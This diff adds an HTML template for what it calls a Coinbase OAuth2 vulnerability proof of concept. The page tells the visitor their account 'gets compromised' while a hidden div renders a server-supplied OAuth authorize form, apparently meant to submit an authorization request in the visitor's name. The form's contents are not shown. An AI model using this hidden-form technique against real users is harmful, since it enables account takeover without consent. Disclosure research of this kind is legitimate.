@@ -1,0 +1,33 @@
+<!doctype html>
+    <head>
+        <title>Coinbase - OAuth2 Vulnerability Proof-Of-Concept</title>
+        <link href="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
+        <style type="text/css">
+          body {
+            padding-top: 30px; /* 60px to make the container go all the way to the bottom of the topbar */
+          }
+          .main {
+          	margin-top: 30px;
+         	}
+        </style>
+    </head>
+    <body>
+        <div class="navbar navbar-inverse navbar-fixed-top">
+          <div class="navbar-inner">
+            <div class="container">
+              <a class="brand" href="/">Coinbase - OAuth2 Vulnerability Proof-Of-Concept</a>
+          </div>
+        </div>
+
+        <div class="container main">
+          <div class="row span8 offset2">
+		        <h2>Sending authorize request</h2>
+		        <p>Please wait while your Coinbase account gets compromised...</p>
+		        <div id="oauthform" style="display: none">
+		          {{ oauthform|safe }}
+		        </div>
+          </div>
+        </div> <!-- /container -->
+    </body>
+</html>
+
